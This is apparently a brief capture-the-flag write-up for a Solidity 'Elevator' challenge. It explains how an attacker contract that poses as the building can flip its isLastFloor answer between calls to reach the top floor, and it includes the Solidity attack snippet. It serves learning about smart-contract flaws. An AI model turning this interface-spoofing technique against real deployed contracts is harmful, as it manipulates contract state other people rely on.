# elevator-pure-constant-vulnerability
A case where pure is not used and elevator does not refer to building within the contract. So we can become the "building"

We created a new contract that points to our target contract and then we became the "building" so we can set which floor to go to and set that one as the last floor
This happens because the elevator does not implement building or the other way around and the contract does not use pure which has now replaced constant

```
  address instance = 0x35f3c1cB96C9A8e88D99fcac52c21584AFAF98C1;
  Elevator public target;
  bool result = true;
  function isLastFloor(uint) public returns (bool){

    if(result == true)
    {

      result = false;
    }
    else {

      result = true;
    }
    return result;
  }

  function attack() public {
    target.goTo(6); 
  }
```
